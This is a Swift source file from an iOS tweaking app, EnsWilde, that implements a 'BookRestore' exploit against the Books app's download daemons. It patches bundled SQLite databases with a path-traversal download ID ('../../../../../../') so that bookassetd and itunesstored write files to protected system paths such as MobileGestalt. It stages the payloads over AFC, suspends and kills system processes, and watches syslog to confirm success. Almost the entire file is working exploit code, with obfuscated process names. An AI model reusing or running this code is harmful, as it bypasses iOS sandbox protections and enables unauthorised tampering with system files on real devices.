//
//  BookRestoreApplyTask.swift
//  EnsWilde
//
//  Unified task for applying multiple files via BookRestore method
//

import Foundation
import UIKit
import SQLite3

/// Unified BookRestore application task that can handle multiple files from different tools
enum BookRestoreApplyTask {
    
    /// Apply multiple files using the BookRestore (Books app) exploit
    /// - Parameters:
    ///   - files: Files to apply
    ///   - store: Tool store
    ///   - onLogUpdate: Optional closure to receive exploit verification log updates
    static func applyFiles(_ files: [BookRestoreFile], store: ToolStore, onLogUpdate: ((String) -> Void)? = nil) async throws {
        guard !files.isEmpty else {
            throw ToolTaskError.generic("No files to apply")
        }
        
        guard let context = JITEnableContext.shared else {
            throw ToolTaskError.invalidContext
        }
        
        // Start logging session
        ApplyLogger.shared.startSession()
        ApplyLogger.shared.log("Starting BookRestore exploit with \(files.count) file(s)")
        
        // Ensure HTTP server is ready
        _ = try await Utils.ensureHTTPServerReady(timeoutSeconds: 5)
        
        // Get or capture bookassetd UUID
        let uuid: String
        if let v = store.bookassetdUUID, !v.isEmpty {
            uuid = v
        } else {
            let captured = try await BookassetdUUIDHelper.captureUUID(
                timeout: 120,
                openBooksFirst: true,
                returnToAppAfterCapture: true
            )
            store.bookassetdUUID = captured
            uuid = captured
        }
        
        let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let d28LocalPath = documentsDirectory.appendingPathComponent("downloads.28.sqlitedb").path
        let bldLocalPath = documentsDirectory.appendingPathComponent("BLDatabaseManager.sqlite").path
        
        // Reset and seed database copies
        try resetAndSeedLocalDBCopies(d28LocalPath: d28LocalPath, bldLocalPath: bldLocalPath)
        
        // Verify BL database files are accessible via HTTP
        try await Utils.verifyLocalHTTPFileAccessible(pathComponent: "BLDatabaseManager.sqlite")
        try await Utils.verifyLocalHTTPFileAccessible(pathComponent: "BLDatabaseManager.sqlite-shm")
        try await Utils.verifyLocalHTTPFileAccessible(pathComponent: "BLDatabaseManager.sqlite-wal")
        
        // Patch downloads.28 database to point to our local server
        try Databases.patchDownloads28Database(
            dbPath: d28LocalPath,
            uuid: uuid,
            ip: "localhost",
            port: Utils.port,
            blFileNameOnServer: "BLDatabaseManager.sqlite"
        )
        
        // Ensure all file contents are in Documents and accessible
        for file in files {
            let fileName = file.localFileName ?? (file.targetPath as NSString).lastPathComponent
            let targetPath = file.targetPath
            
            do {
                if let localFileName = file.localFileName {
                    // For wallet images, write contents to Documents (they're not in bundle)
                    if file.fileType == .walletImage, let contents = file.contents {
                        let dstPath = documentsDirectory.appendingPathComponent(localFileName).path
                        try contents.write(to: URL(fileURLWithPath: dstPath))
                        ApplyLogger.shared.logFileOperation(
                            fileName: localFileName,
                            sourcePath: "WalletCards/{cardID}",
                            targetPath: targetPath,
                            success: true
                        )
                    } else {
                        // For other files with localFileName, copy from bundle/zPatchCustomFiles
                        try ensureBundledFileCopiedToDocuments(fileName: localFileName)
                        ApplyLogger.shared.logFileOperation(
                            fileName: localFileName,
                            sourcePath: "Bundle/Resources",
                            targetPath: targetPath,
                            success: true
                        )
                    }
                    try await Utils.verifyLocalHTTPFileAccessible(pathComponent: localFileName)
                } else if let contents = file.contents {
                    // For MobileGestalt/Custom files, write to Documents
                    let fileName = (targetPath as NSString).lastPathComponent
                    let dstPath = documentsDirectory.appendingPathComponent(fileName).path
                    try contents.write(to: URL(fileURLWithPath: dstPath))
                    
                    let sourceDesc: String
                    switch file.fileType {
                    case .mobileGestalt:
                        sourceDesc = "MobileGestalt"
                    default:
                        sourceDesc = "CustomFiles"
                    }
                    ApplyLogger.shared.logFileOperation(
                        fileName: fileName,
                        sourcePath: sourceDesc,
                        targetPath: targetPath,
                        success: true
                    )
                }
            } catch {
                ApplyLogger.shared.logFileOperation(
                    fileName: fileName,
                    sourcePath: "Unknown",
                    targetPath: targetPath,
                    success: false,
                    error: error.localizedDescription
                )
                throw error
            }
        }
        
        // Patch BLDatabaseManager.sqlite with ALL files at once
        try patchBLDatabaseManagerWithAllFiles(
            bldLocalPath: bldLocalPath,
            files: files
        )
        
        // For MobileGestalt files, push to Media folder via AFC
        for file in files where file.fileType == .mobileGestalt {
            if let contents = file.contents {
                let fileName = (file.targetPath as NSString).lastPathComponent
                try context.afcPushData(contents, toPath: fileName)
            }
        }
        
        // For Custom, FeatureFlags, and Placeholder files, push to Media folder via AFC
        for file in files where file.fileType == .custom || file.fileType == .featureFlags || file.fileType == .placeholder {
            if let contents = file.contents {
                let fileName = (file.targetPath as NSString).lastPathComponent
                try context.afcPushData(contents, toPath: fileName)
            }
        }
        
        // For Wallet Image files, push to Media folder via AFC
        for file in files where file.fileType == .walletImage {
            if let contents = file.contents, let fileName = file.localFileName {
                try context.afcPushData(contents, toPath: fileName)
            }
        }
        
        // Pause bookassetd with SIGSTOP (signal 19) BEFORE uploading DB
        // This prevents bookassetd from reading the old DB while we're uploading.
        // It will be SIGKILL'd immediately after the upload — before killing itunesstored.
        ApplyLogger.shared.log("=== BookRestore Exploit Started ===")
        ApplyLogger.shared.log("Total files to apply: \(files.count)")
        onLogUpdate?("Starting BookRestore exploit with \(files.count) file(s)")
        
        var processes = try getRunningProcesses()
        var pid_bookassetd: Int32?
        // Use obfuscated process paths
        if let pid = processes.first(where: { $0.value?.hasSuffix(ObfuscatedPaths.bookassetdProcess) == true })?.key {
            pid_bookassetd = pid
            try context.killProcess(withPID: pid, signal: 19)  // SIGSTOP - pause the process
            ApplyLogger.shared.log("✓ Paused bookassetd (PID: \(pid)) with SIGSTOP")
            onLogUpdate?("✓ Paused bookassetd process")
        }
        if let pid_books = processes.first(where: { $0.value?.hasSuffix(ObfuscatedPaths.booksProcess) == true })?.key {
            try context.killProcess(withPID: pid_books, signal: SIGKILL)
            ApplyLogger.shared.log("✓ Killed Books app (PID: \(pid_books))")
        }
        
        // Upload databases while bookassetd is paused
        ApplyLogger.shared.log("Uploading database files...")
        onLogUpdate?("Uploading database files...")
        try context.afcPushFile(d28LocalPath, toPath: "Downloads/downloads.28.sqlitedb")
        try context.afcPushFile(d28LocalPath + "-shm", toPath: "Downloads/downloads.28.sqlitedb-shm")
        try context.afcPushFile(d28LocalPath + "-wal", toPath: "Downloads/downloads.28.sqlitedb-wal")
        
        ApplyLogger.shared.log("✓ Database uploaded successfully (bookassetd still paused)")
        onLogUpdate?("✓ Database uploaded")
        
        // Kill bookassetd NOW — DB is safely uploaded so bookassetd is no longer needed in paused state.
        // This matches Nugget's order (line ~405): SIGKILL bookassetd BEFORE killing itunesstored.
        // If bookassetd stays paused (SIGSTOP) while we kill itunesstored, itunesstored restarts and
        // tries to queue the download to bookassetd — which never responds — causing itunesstored to
        // block and the "Install complete... result: Failed" message to never be emitted (120s hang).
        if let pid = pid_bookassetd {
            try context.killProcess(withPID: pid, signal: SIGKILL)
            ApplyLogger.shared.log("✓ Killed bookassetd (PID: \(pid)) after DB upload")
            onLogUpdate?("✓ Killed bookassetd")
        }
        
        // Kill itunesstored to trigger download (Nugget line 407-408)
        ApplyLogger.shared.log("Killing itunesstored to trigger processing...")
        processes = try getRunningProcesses()
        if let pid_itunesstored = processes.first(where: { $0.value?.hasSuffix(ObfuscatedPaths.itunesstored) == true })?.key {
            try context.killProcess(withPID: pid_itunesstored, signal: SIGKILL)
            ApplyLogger.shared.log("✓ Killed itunesstored (PID: \(pid_itunesstored))")
            onLogUpdate?("✓ Killed itunesstored")
        }
        
        // Wait for itunesstored to process the download (Nugget line 410-417)
        // This is where we wait for "Install complete... result: Failed"
        // Reduced timeout to 25s — with bookassetd dead, itunesstored processes quickly.
        ApplyLogger.shared.log("Waiting for itunesstored to process database (timeout: 25s)...")
        onLogUpdate?("Waiting for itunesstored to process database...")
        let itunestoredSuccess = try await waitForItunesstored(timeout: 25, onLogUpdate: onLogUpdate)
        ApplyLogger.shared.log("✓ itunesstored processing complete: \(itunestoredSuccess)")
        onLogUpdate?("✓ itunesstored processing complete")
        
        // Kill any newly-spawned bookassetd/Books before opening Books fresh (Nugget line 419-424)
        ApplyLogger.shared.log("Killing any residual bookassetd and Books...")
        processes = try getRunningProcesses()
        if let pid = processes.first(where: { $0.value?.hasSuffix(ObfuscatedPaths.bookassetdProcess) == true })?.key {
            try context.killProcess(withPID: pid, signal: SIGKILL)
            ApplyLogger.shared.log("✓ Killed residual bookassetd (PID: \(pid))")
        }
        if let pid = processes.first(where: { $0.value?.hasSuffix(ObfuscatedPaths.booksProcess) == true })?.key {
            try context.killProcess(withPID: pid, signal: SIGKILL)
            ApplyLogger.shared.log("✓ Killed Books app (PID: \(pid))")
        }
        
        // Open Books app (Nugget line 427)
        ApplyLogger.shared.log("Launching Books app to trigger bookassetd...")
        onLogUpdate?("Launching Books app...")
        LSApplicationWorkspaceDefaultWorkspace().openApplication(withBundleID: "com.apple.iBooks")
        ApplyLogger.shared.log("✓ Books app launched")
        
        // Wait for bookassetd to finish writing all files (Nugget line 432-463, LocalHost mode)
        // Nugget waits for "[Install-Mgr]: Marking download as [finished]" × fileCount times,
        // with a 20-second timeout for LocalHost mode.
        // Without this wait, the 5-second fixed sleep was too short: bookassetd had not finished
        // writing files before the respring, so Feature Flags (and other tweaks) never took effect.
        let bookrestoreFileCount = files.filter { $0.fileType != .placeholder }.count
        ApplyLogger.shared.log("Waiting for bookassetd to finish writing \(bookrestoreFileCount) file(s) (timeout: 20s)...")
        onLogUpdate?("Waiting for bookassetd to write files...")
        _ = try await waitForBookassetdFinished(fileCount: bookrestoreFileCount, timeout: 20, onLogUpdate: onLogUpdate)
        ApplyLogger.shared.log("✓ bookassetd file-write phase complete")
        
        ApplyLogger.shared.log("=== BookRestore Exploit Completed ===")
        onLogUpdate?("✓ BookRestore exploit completed successfully")
        ApplyLogger.shared.log("Apply operation completed successfully")
        
        // End logging session and save to file
        ApplyLogger.shared.endSession()
    }
    
    // MARK: - Exploit Verification Functions
    
    /// Wait for itunesstored to complete processing (Nugget line 410-417)
    /// Looks for: "Install complete for download: 6936249076851270152 result: Failed"
    private static func waitForItunesstored(timeout: TimeInterval, onLogUpdate: ((String) -> Void)?) async throws -> String {
        ApplyLogger.shared.log("[waitForItunesstored] Starting syslog relay...")
        return try await withCheckedThrowingContinuation { continuation in
            var finished = false
            let startTime = Date()
            var logLineCount = 0
            
            JITEnableContext.shared?.startSyslogRelay { line in
                guard !finished else { return }
                guard let line = line else { return }
                
                logLineCount += 1
                
                // Log every 10th line to show we're receiving data
                if logLineCount % 10 == 0 {
                    ApplyLogger.shared.log("[waitForItunesstored] Received \(logLineCount) syslog lines so far...")
                }
                
                // Log interesting lines
                if line.localizedCaseInsensitiveContains("itunesstored") ||
                   line.localizedCaseInsensitiveContains("Install") ||
                   line.localizedCaseInsensitiveContains("bookassetd") {
                    ApplyLogger.shared.log("[Syslog] \(line)")
                }
                
                // Check for itunesstored "Install complete... result: Failed"
                if line.localizedCaseInsensitiveContains("itunesstored") &&
                   line.localizedCaseInsensitiveContains("Install complete") &&
                   line.localizedCaseInsensitiveContains("result: Failed") {
                    finished = true
                    JITEnableContext.shared?.stopSyslogRelay()
                    ApplyLogger.shared.log("[waitForItunesstored] ✓ Found success message after \(logLineCount) lines")
                    ApplyLogger.shared.log("[waitForItunesstored] Elapsed time: \(String(format: "%.2f", Date().timeIntervalSince(startTime)))s")
                    DispatchQueue.main.async {
                        onLogUpdate?("✓ itunesstored: Install complete result Failed")
                    }
                    continuation.resume(returning: "itunesstored processing complete")
                    return
                }
                
                // Check timeout
                if Date().timeIntervalSince(startTime) > timeout {
                    finished = true
                    JITEnableContext.shared?.stopSyslogRelay()
                    ApplyLogger.shared.log("[waitForItunesstored] ⚠ Timeout after \(Int(timeout))s (\(logLineCount) lines processed)")
                    DispatchQueue.main.async {
                        onLogUpdate?("⚠ itunesstored timeout after \(Int(timeout))s, proceeding...")
                    }
                    continuation.resume(returning: "Timeout but proceeding")
                    return
                }
            } onError: { error in
                guard !finished else { return }
                finished = true
                JITEnableContext.shared?.stopSyslogRelay()
                let errorDesc = error?.localizedDescription ?? "Unknown error"
                ApplyLogger.shared.log("[waitForItunesstored] ⚠ Syslog error: \(errorDesc)")
                DispatchQueue.main.async {
                    onLogUpdate?("⚠ Syslog error, proceeding...")
                }
                continuation.resume(returning: "Error but proceeding")
            }
            
            // Set timeout task
            Task {
                try? await Task.sleep(nanoseconds: UInt64(timeout * 1_000_000_000))
                guard !finished else { return }
                finished = true
                JITEnableContext.shared?.stopSyslogRelay()
                DispatchQueue.main.async {
                    onLogUpdate?("⚠ itunesstored verification timed out, proceeding...")
                }
                continuation.resume(returning: "Timeout but proceeding")
            }
        }
    }
    
    /// Wait for bookassetd to mark downloads as finished (Nugget line 432-446)
    /// Looks for: "[Install-Mgr]: Marking download as [finished]"
    /// LocalHost mode (HTTP server): Exits after FIRST file (fileCount=1)
    /// OnDevice mode (GitHub URLs): Waits for ALL files
    private static func waitForBookassetdFinished(fileCount: Int, timeout: TimeInterval, onLogUpdate: ((String) -> Void)?) async throws -> String {
        return try await withCheckedThrowingContinuation { continuation in
            var finished = false
            var finishedFilesCount = 0
            let startTime = Date()
            
            JITEnableContext.shared?.startSyslogRelay { line in
                guard !finished else { return }
                guard let line = line else { return }
                
                // Look for bookassetd "Marking download as [finished]" with proper format
                // Nugget line 432: success_message = "[Install-Mgr]: Marking download as [finished]"
                if line.localizedCaseInsensitiveContains("bookassetd") &&
                   (line.localizedCaseInsensitiveContains("Marking download as") &&
                    (line.localizedCaseInsensitiveContains("[finished]") || line.localizedCaseInsensitiveContains("finished"))) {
                    finishedFilesCount += 1
                    DispatchQueue.main.async {
                        onLogUpdate?("✓ File marked finished: \(finishedFilesCount)")
                    }
                    ApplyLogger.shared.log("bookassetd marked file \(finishedFilesCount) as finished")
                    
                    // Nugget line 442: if transfer_mode != BookRestoreFileTransferMethod.LocalHost or num_replaced >= z_id:
                    // LocalHost: breaks after first file (fileCount=1)
                    // OnDevice: waits for all files (fileCount=total)
                    if finishedFilesCount >= fileCount {
                        finished = true
                        JITEnableContext.shared?.stopSyslogRelay()
                        DispatchQueue.main.async {
                            onLogUpdate?("✓ Exploit confirmed: bookassetd finished processing")
                        }
                        continuation.resume(returning: "BookRestore exploit completed successfully")
                        return
                    }
                }
                
                // Check timeout
                if Date().timeIntervalSince(startTime) > timeout {
                    finished = true
                    JITEnableContext.shared?.stopSyslogRelay()
                    let message = finishedFilesCount > 0 ?
                        "⚠ Timeout after \(Int(timeout))s with \(finishedFilesCount) files marked, proceeding..." :
                        "⚠ Timeout after \(Int(timeout))s with no files detected, proceeding..."
                    DispatchQueue.main.async {
                        onLogUpdate?(message)
                    }
                    continuation.resume(returning: "Timeout after marking \(finishedFilesCount) files")
                    return
                }
            } onError: { error in
                guard !finished else { return }
                finished = true
                JITEnableContext.shared?.stopSyslogRelay()
                DispatchQueue.main.async {
                    onLogUpdate?("⚠ Syslog error after \(finishedFilesCount) files, proceeding...")
                }
                continuation.resume(returning: "Error after \(finishedFilesCount) files")
            }
            
            // Set timeout task
            Task {
                try? await Task.sleep(nanoseconds: UInt64(timeout * 1_000_000_000))
                guard !finished else { return }
                finished = true
                JITEnableContext.shared?.stopSyslogRelay()
                let message = finishedFilesCount > 0 ?
                    "⚠ Timeout with \(finishedFilesCount) files marked, proceeding..." :
                    "⚠ Timeout with no files detected, proceeding..."
                DispatchQueue.main.async {
                    onLogUpdate?(message)
                }
                continuation.resume(returning: "Timeout after marking \(finishedFilesCount) files")
            }
        }
    }
    
    // MARK: - Legacy Polyglot Verification (Kept for backwards compatibility)
    
    /// Wait for exploit completion by listening to syslog for success patterns
    /// Uses "Polyglot" verification: triggers on ANY of multiple success conditions
    /// NOTE: This is now split into waitForItunesstored + waitForBookassetdFinished for accuracy
    private static func waitForExploitCompletion(fileCount: Int, timeout: TimeInterval, onLogUpdate: ((String) -> Void)?) async throws -> String {
        return try await withCheckedThrowingContinuation { continuation in
            var finished = false
            var exploitConfirmed = false
            var finishedFilesCount = 0
            
            JITEnableContext.shared?.startSyslogRelay { line in
                guard !finished else { return }
                guard let line = line else { return }
                
                // Condition A (Highest Priority): The Move
                // Process bookassetd logs: "Moving temporary" AND "requested URL"
                if line.localizedCaseInsensitiveContains("bookassetd") &&
                   line.localizedCaseInsensitiveContains("Moving temporary") &&
                   line.localizedCaseInsensitiveContains("requested URL") {
                    finished = true
                    exploitConfirmed = true
                    JITEnableContext.shared?.stopSyslogRelay()
                    DispatchQueue.main.async {
                        onLogUpdate?("✓ Exploit confirmed: bookassetd moving file")
                    }
                    continuation.resume(returning: "Exploit Confirmed: \(line)")
                    return
                }
                
                // Condition B: Unzip Fail (for Sound/Plist files)
                // Process itunesstored logs: "Failing install" AND "unzip failure"
                if line.localizedCaseInsensitiveContains("itunesstored") &&
                   line.localizedCaseInsensitiveContains("Failing install") &&
                   line.localizedCaseInsensitiveContains("unzip failure") {
                    finished = true
                    exploitConfirmed = true
                    JITEnableContext.shared?.stopSyslogRelay()
                    DispatchQueue.main.async {
                        onLogUpdate?("✓ Exploit confirmed: itunesstored unzip handling")
                    }
                    continuation.resume(returning: "Exploit Confirmed: \(line)")
                    return
                }
                
                // Condition C: Install Fail (for Book files)
                // Process itunesstored logs: "Install complete" AND "result: Failed"
                if line.localizedCaseInsensitiveContains("itunesstored") &&
                   line.localizedCaseInsensitiveContains("Install complete") &&
                   line.localizedCaseInsensitiveContains("result: Failed") {
                    finished = true
                    exploitConfirmed = true
                    JITEnableContext.shared?.stopSyslogRelay()
                    DispatchQueue.main.async {
                        onLogUpdate?("✓ Exploit confirmed: itunesstored install failure")
                    }
                    continuation.resume(returning: "Exploit Confirmed: \(line)")
                    return
                }
                
                // Condition D (Legacy): Marking download as finished
                // Process bookassetd logs: "Marking download as [finished]"
                // CRITICAL FIX #2: Count finished files and wait for ALL files
                if line.localizedCaseInsensitiveContains("bookassetd") &&
                   line.localizedCaseInsensitiveContains("Marking download as") &&
                   (line.localizedCaseInsensitiveContains("finished") || line.localizedCaseInsensitiveContains("[finished]")) {
                    finishedFilesCount += 1
                    DispatchQueue.main.async {
                        onLogUpdate?("✓ File processed: \(finishedFilesCount)/\(fileCount)")
                    }
                    
                    // Only confirm when ALL files are marked as finished
                    if finishedFilesCount >= fileCount {
                        finished = true
                        exploitConfirmed = true
                        JITEnableContext.shared?.stopSyslogRelay()
                        DispatchQueue.main.async {
                            onLogUpdate?("✓ Exploit confirmed: All \(fileCount) files processed")
                        }
                        continuation.resume(returning: "Exploit Confirmed: All \(fileCount) files marked as finished")
                        return
                    }
                }
            } onError: { error in
                guard !finished else { return }
                finished = true
                JITEnableContext.shared?.stopSyslogRelay()
                // Don't fail on error, just warn
                DispatchQueue.main.async {
                    onLogUpdate?("⚠ Syslog relay error, proceeding anyway...")
                }
                continuation.resume(returning: "Proceeding without log verification")
            }
            
            // Soft timeout: Don't fail, just warn and proceed
            DispatchQueue.global().asyncAfter(deadline: .now() + timeout) {
                guard !finished else { return }
                finished = true
                JITEnableContext.shared?.stopSyslogRelay()
                if !exploitConfirmed {
                    DispatchQueue.main.async {
                        onLogUpdate?("⚠ Log verification timed out after \(Int(timeout))s, proceeding...")
                    }
                }
                continuation.resume(returning: "Timed out but proceeding")
            }
        }
    }
    
    // MARK: - Private Helpers
    
    /// Patch BLDatabaseManager.sqlite with multiple files
    private static func patchBLDatabaseManagerWithAllFiles(
        bldLocalPath: String,
        files: [BookRestoreFile]
    ) throws {
        // We need to insert multiple rows into ZBLDOWNLOADINFO table
        // First, clear existing rows
        var db: OpaquePointer?
        guard sqlite3_open(bldLocalPath, &db) == SQLITE_OK else {
            throw NSError(domain: "SQLite", code: 2, userInfo: [NSLocalizedDescriptionKey: "Unable to open BLDatabaseManager DB"])
        }
        defer { sqlite3_close(db) }
        
        // Clear existing rows
        try Databases.execSQL(db: db, sql: "DELETE FROM ZBLDOWNLOADINFO;")
        
        // Read zfileattributes.plist for ZFILEATTRIBUTES column
        let attrData = try loadZFileAttributes()
        
        // Insert a row for each file
        // NOTE: Skip placeholder files - they are only used for folder creation via AFC
        // and should NOT be inserted into ZBLDOWNLOADINFO. Including them causes
        // itunesstored to hang because it tries to process dummy URLs (e.g. robots.txt)
        var zPK = 0
        for file in files {
            if file.fileType == .placeholder {
                continue
            }
            zPK += 1
            
            let zassetPath: String
            let zplistPath: String
            let zdownloadID: String
            let zurl: String
            
            // CRITICAL: Determine if this file should use LocalHost mode (HTTP download)
            // or zassetpath mode (Media folder + path traversal)
            // Nugget logic: files in /var/mobile or /private/var/mobile use LocalHost mode
            let isUnderVarMobile = file.targetPath.hasPrefix("/var/mobile/") ||
                                   file.targetPath.hasPrefix("/private/var/mobile/")
            
            if isUnderVarMobile {
                // LocalHost mode: Direct HTTP download (Nugget line 248-256)
                // Used for: Passcode themes (/var/mobile/Library/Caches/TelephonyUI-10/),
                //           Wallet images (/var/mobile/Library/Passes/Cards/...),
                //           Sound files (/var/mobile/Library/Audio/UISounds/)
                zassetPath = file.targetPath
                zplistPath = file.targetPath
                zdownloadID = file.targetPath
                
                let fileName = file.localFileName ?? (file.targetPath as NSString).lastPathComponent
                zurl = "http://localhost:\(Utils.port)/\(fileName)"
                
            } else {
                // ZAssetPath mode: Write to Media folder, then use .zassetpath traversal
                // Used for: MobileGestalt files, Custom files outside /var/mobile
                let normalized: String
                if file.targetPath.hasPrefix("/private/var/") {
                    normalized = file.targetPath
                } else if file.targetPath.hasPrefix("/var/") {
                    normalized = "/private" + file.targetPath
                } else {
                    normalized = file.targetPath
                }
                
                zassetPath = normalized + ".zassetpath"
                let trimmedLeadingSlash = normalized.hasPrefix("/") ? String(normalized.dropFirst()) : normalized
                zdownloadID = "../../../../../../" + trimmedLeadingSlash
                
                // ZPLISTPATH stays at /var/mobile/Media/...
                let fileName = file.localFileName ?? (file.targetPath as NSString).lastPathComponent
                zplistPath = "/var/mobile/Media/\(fileName)"
                
                // URL selection for ZAssetPath mode:
                // - featureFlags: its plist is written to Documents and served by the local HTTP
                //   server, so use http://localhost to let itunesstored download it instantly on-device.
                //   Using an external dummy URL (robots.txt) would cause itunesstored to make an
                //   outbound network request that can hang, preventing "Install complete" from firing.
                // - Other ZAssetPath files (e.g. MobileGestalt): content is only in the AFC Media
                //   folder (not served via local HTTP), so a dummy external URL is required.
                //   Note: localhost is always plain HTTP (no certificate needed) — consistent with
                //   other LocalHost-mode URLs in this file.
                if file.fileType == .featureFlags {
                    zurl = "http://localhost:\(Utils.port)/\(fileName)"
                } else {
                    zurl = "https://www.google.com/robots.txt"
                }
            }
            
            // Build SQL insert
            let zassetPathEsc = escapeSQLString(zassetPath)
            let zplistPathEsc = escapeSQLString(zplistPath)
            let zdownloadIDEsc = escapeSQLString(zdownloadID)
            let zurlEsc = escapeSQLString(zurl)
            let fileName = (file.targetPath as NSString).lastPathComponent
            let fileNameEsc = escapeSQLString(fileName)
            
            // Insert row with all required fields
            let sql = """
            INSERT INTO ZBLDOWNLOADINFO (
                Z_PK, Z_ENT, Z_OPT, ZACCOUNTIDENTIFIER, ZCLEANUPPENDING, ZFAMILYACCOUNTIDENTIFIER,
                ZISAUTOMATICDOWNLOAD, ZISLOCALCACHESERVER, ZNUMBEROFBYTESTOHASH, ZPERSISTENTIDENTIFIER,
                ZPUBLICATIONVERSION, ZSIZE, ZSTATE, ZSTOREIDENTIFIER,
                ZLASTSTATECHANGETIME, ZSTARTTIME,
                ZASSETPATH, ZBUYPARAMETERS, ZCANCELDOWNLOADURL, ZCLIENTIDENTIFIER,
                ZCOLLECTIONARTISTNAME, ZCOLLECTIONTITLE, ZDOWNLOADID, ZGENRE, ZKIND,
                ZPLISTPATH, ZSUBTITLE, ZTHUMBNAILIMAGEURL, ZTITLE, ZTRANSACTIONIDENTIFIER,
                ZURL, ZFILEATTRIBUTES
            ) VALUES (
                \(zPK), 2, 3, 0, 0, 0,
                0, 0, 0, 0,
                0, 0, 2, 765107108,
                767991550.119197, 767991353.245275,
                '\(zassetPathEsc)', 'productType=PUB&price=0&salableAdamId=765107106&pricingParameters=PLUS&pg=default&mtApp=com.apple.iBooks&mtEventTime=1746298553233&mtOsVersion=18.4.1&mtPageId=SearchIncrementalTopResults&mtPageType=Search&mtPageContext=search&mtTopic=xp_amp_bookstore&mtRequestId=35276ff6-5c8b-4136-894e-b6d8fc7677b3',
                'https://p19-buy.itunes.apple.com/WebObjects/MZFastFinance.woa/wa/songDownloadDone?download-id=J19N_PUB_190099164604738&cancel=1',
                '4GG2695MJK.com.apple.iBooks',
                'EnsWilde', '\(fileNameEsc)', '\(zdownloadIDEsc)', 'Contemporary Romance', 'ebook',
                '\(zplistPathEsc)', 'Applied via EnsWilde', 'https://is1-ssl.mzstatic.com/image/thumb/Publication126/v4/3d/b6/0a/3db60a65-b1a5-51c3-b306-c58870663fd3/Portada.jpg/200x200bb.jpg',
                'EnsWilde File', 'J19N_PUB_190099164604738',
                '\(zurlEsc)', ?
            );
            """
            
            // Execute with blob parameter
            var stmt: OpaquePointer?
            guard sqlite3_prepare_v2(db, sql, -1, &stmt, nil) == SQLITE_OK else {
                throw NSError(domain: "SQLite", code: 3, userInfo: [NSLocalizedDescriptionKey: "Failed to prepare insert statement"])
            }
            defer { sqlite3_finalize(stmt) }
            
            // Bind blob for ZFILEATTRIBUTES
            attrData.withUnsafeBytes { bytes in
                sqlite3_bind_blob(stmt, 1, bytes.baseAddress, Int32(attrData.count), nil)
            }
            
            guard sqlite3_step(stmt) == SQLITE_DONE else {
                throw NSError(domain: "SQLite", code: 4, userInfo: [NSLocalizedDescriptionKey: "Failed to insert row for \(file.targetPath)"])
            }
        }
        
        _ = sqlite3_exec(db, "COMMIT;", nil, nil, nil)
    }
    
    private static func loadZFileAttributes() throws -> Data {
        guard let path = Bundle.main.path(forResource: "zfileattributes", ofType: "plist") else {
            throw ToolTaskError.generic("Missing zfileattributes.plist in bundle")
        }
        return try Data(contentsOf: URL(fileURLWithPath: path))
    }
    
    private static func escapeSQLString(_ s: String) -> String {
        s.replacingOccurrences(of: "'", with: "''")
    }
    
    private static func resetAndSeedLocalDBCopies(d28LocalPath: String, bldLocalPath: String) throws {
        let fm = FileManager.default
        let bundle = Bundle.main
        
        // downloads.28
        try? fm.removeItem(atPath: d28LocalPath)
        try? fm.removeItem(atPath: d28LocalPath + "-wal")
        try? fm.removeItem(atPath: d28LocalPath + "-shm")
        
        guard let d28Resource = bundle.path(forResource: "downloads.28", ofType: "sqlitedb") else {
            throw ToolTaskError.generic("Missing downloads.28.sqlitedb in bundle")
        }
        try fm.copyItem(atPath: d28Resource, toPath: d28LocalPath)
        
        // BLDatabaseManager.sqlite (+shm/+wal)
        try? fm.removeItem(atPath: bldLocalPath)
        try? fm.removeItem(atPath: bldLocalPath + "-shm")
        try? fm.removeItem(atPath: bldLocalPath + "-wal")
        
        guard let bl = bundle.path(forResource: "BLDatabaseManager", ofType: "sqlite") else {
            throw ToolTaskError.generic("Missing BLDatabaseManager.sqlite in bundle")
        }
        try fm.copyItem(atPath: bl, toPath: bldLocalPath)
        
        guard let blShm = bundle.path(forResource: "BLDatabaseManager", ofType: "sqlite-shm") else {
            throw ToolTaskError.generic("Missing BLDatabaseManager.sqlite-shm in bundle")
        }
        try fm.copyItem(atPath: blShm, toPath: bldLocalPath + "-shm")
        
        guard let blWal = bundle.path(forResource: "BLDatabaseManager", ofType: "sqlite-wal") else {
            throw ToolTaskError.generic("Missing BLDatabaseManager.sqlite-wal in bundle")
        }
        try fm.copyItem(atPath: blWal, toPath: bldLocalPath + "-wal")
    }
    
    private static func ensureBundledFileCopiedToDocuments(fileName: String) throws {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let dst = docs.appendingPathComponent(fileName).path
        
        // If file already exists in Documents root, we're good
        if FileManager.default.fileExists(atPath: dst) { return }
        
        // Check if file exists in zPatchCustomFiles subdirectory
        let customFilesPath = docs.appendingPathComponent("zPatchCustomFiles").appendingPathComponent(fileName).path
        if FileManager.default.fileExists(atPath: customFilesPath) {
            // Copy from zPatchCustomFiles to Documents root for HTTP serving
            try FileManager.default.copyItem(atPath: customFilesPath, toPath: dst)
            return
        }
        
        // Try to find in bundle resources
        if let src = Bundle.main.path(forResource: fileName, ofType: nil) {
            try FileManager.default.copyItem(atPath: src, toPath: dst)
        } else {
            throw ToolTaskError.generic("Missing file: \(fileName). File not found in bundle or zPatchCustomFiles directory.")
        }
    }
    
    private static func getRunningProcesses() throws -> [Int32 : String?] {
        guard let context = JITEnableContext.shared else {
            throw ToolTaskError.invalidContext
        }
        
        guard let processList = try context.fetchProcessList() as? [[String: Any]] else {
            throw ToolTaskError.generic("Failed to fetch process list")
        }
        
        return Dictionary(
            uniqueKeysWithValues: processList.compactMap { item in
                guard let pid = item["pid"] as? Int32 else { return nil }
                let path = item["path"] as? String
                return (pid, path)
            }
        )
    }
}

// Extension to push data via AFC
extension JITEnableContext {
    func afcPushData(_ data: Data, toPath remotePath: String) throws {
        // Create temporary file and push it
        let tempDir = FileManager.default.temporaryDirectory
        let tempFile = tempDir.appendingPathComponent(UUID().uuidString)
        try data.write(to: tempFile)
        defer { try? FileManager.default.removeItem(at: tempFile) }
        
        try afcPushFile(tempFile.path, toPath: remotePath)
    }
}
